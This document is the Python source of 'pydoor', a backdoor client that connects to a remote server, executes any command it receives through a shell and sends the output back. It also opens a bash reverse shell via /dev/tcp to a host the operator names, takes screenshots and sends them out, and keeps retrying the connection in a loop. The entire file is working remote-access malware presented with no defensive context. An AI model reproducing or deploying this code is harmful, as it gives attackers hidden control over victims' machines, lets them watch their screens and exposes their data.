#!/usr/bin/env python

import socket
import time
import subprocess
import os
import sys
import argparse
import time
import base64
import pyautogui


BUFFER = 4096

class ScreenshotHandler:
    def __init__(self, sock):
        self.sock = sock
        data = self.take_screenshot()
        self.send_screenshot(data)


    def take_screenshot(self):
        s = pyautogui.screenshot("/tmp/ss.png")
        #data = base64.urlsafe_b64encode(s.tobytes())
        filetosend = open("/tmp/ss.png", "rb")
        data = filetosend.read()
        return data

    def send_screenshot(self, data) -> int:
        try:
            self.sock.sendall(data)
            return 1
        except:
            return 0



class Client:
    def __init__(self):
        self.sock = 0
        self.cmd = 0
        self.shell = "/bin/sh"
        self.args = 0
        self.cargs = 0
        self.port = 0
        self.ip = 0


    def sleep(self):
        self.sock.send(b"pydoor.quit")
        time.sleep(1) #Temporary solution
        self.sock.close()
        self.start()
    def parse_args(self):
        parser = argparse.ArgumentParser(
            description='pydoor_decription.')
        parser.add_argument('-p', '--port', default=9999, help='Server port to connect to.', type=int)
        parser.add_argument('-i', '--ip', default="127.0.0.1", help='Server ip to connect to .', type=str)
        self.cargs = parser.parse_args()
        self.port = self.cargs.port
        self.ip = self.cargs.ip

    def checkbash(self):
        
        try:

            subprocess.run(["bash","--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
            self.shell = "/bin/bash"
        except:
            pass

    def checkinstall(self, prog):
        try:

            subprocess.call([prog, "--help"],stderr=subprocess.STDOUT, stdout=subprocess.DEVNULL)
            return True
        except:
            return False

    def argumentize(self):
        self.args = self.cmd.split()

    def processcmd(self):


        if self.cmd:
            print(self.cmd)
            self.argumentize()

            if self.args[0] == "shell":
                subprocess.run([self.shell + f" -i >& /dev/tcp/{self.args[1]}/{self.args[2]} 0>&1"], shell=True)
            elif self.args[0] == "quit":
                self.sock.sendall(b"pydoor.quit")
                sys.exit(0)
            elif self.args[0] == "sleep":
                self.sleep()
            elif self.args[0] == "setshell":
                
                if self.checkinstall(self.args[1]):
                    self.shell = self.args[1]
                    self.sock.sendall(b"Shell successfully changed to" + self.shell.encode())
                else:
                    self.sock.sendall(self.args[1].encode() + b" Doesn't seem to be installed, Exiting.")
            elif self.args[0] == "screenshot":
                s = ScreenshotHandler(self.sock)
                

            
            else:
                j = subprocess.Popen(self.cmd, shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE, executable=self.shell)
                out = j.communicate()[0].decode('utf-8').strip()
                if len(out) == 0:
                    out = "pydoor_null" #Return a special command that will be handled by the server if the command output is empty, this is to prevent infinite hanging when a command returns nothing.
                    
                self.sock.sendall(out.encode())

    def start(self):

        self.parse_args()
        
        print("Starting client" )

        self.checkbash()

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:

            try:
                
                self.sock.connect((self.ip, self.port))
                print("Connected to server")
                self.sock.send(b"Hey")
                while True:
                    self.cmd = self.sock.recv(BUFFER).decode()
                    
                    self.processcmd()
            except SystemExit:
                
                self.sock.send(b"pydoor.quit")
                sys.exit(0)
            except KeyboardInterrupt:
                sys.exit(0)

            except:
                pass
            time.sleep(10) #This is to avoid high cpu usage when the client is running without any server to hear 
                

if __name__ == "__main__":
    c = Client()

    c.start()